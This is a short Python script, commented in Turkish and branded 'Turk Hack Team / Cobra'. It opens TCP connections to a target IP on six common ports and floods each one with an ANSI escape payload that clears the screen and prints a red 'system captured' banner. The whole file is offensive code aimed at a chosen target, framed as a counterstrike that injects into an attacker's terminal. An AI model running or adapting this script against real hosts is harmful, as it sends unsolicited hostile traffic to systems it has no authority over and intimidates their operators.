import socket
import threading
import time

class ReverseStrike:
    def __init__(self):
        # Saldırganın terminalini temizleyen ve kırmızı renkte yazıyı basan ANSI kodu
        self.payload = b"\033[2J\033[H\033[1;31mSistem Cobra tarafindan ele gecirildi - Turk Hack Team\033[0m\n"
        self.target_ports = [22, 23, 80, 443, 8080, 53] # Sızma denenecek portlar

    def inject_payload(self, target_ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((target_ip, port))
            # Karşı terminal ekranına doğrudan enjeksiyon
            s.send(self.payload * 10) # Garanti olması için art arda gönder
            s.close()
        except:
            pass

    def launch(self, target_ip):
        print(f"[\033[1;31m!\033[0m] COBRA SALDIRIYA GEÇTİ: {target_ip} Hedef Alındı!")
        threads = []
        for port in self.target_ports:
            t = threading.Thread(target=self.inject_payload, args=(target_ip, port))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
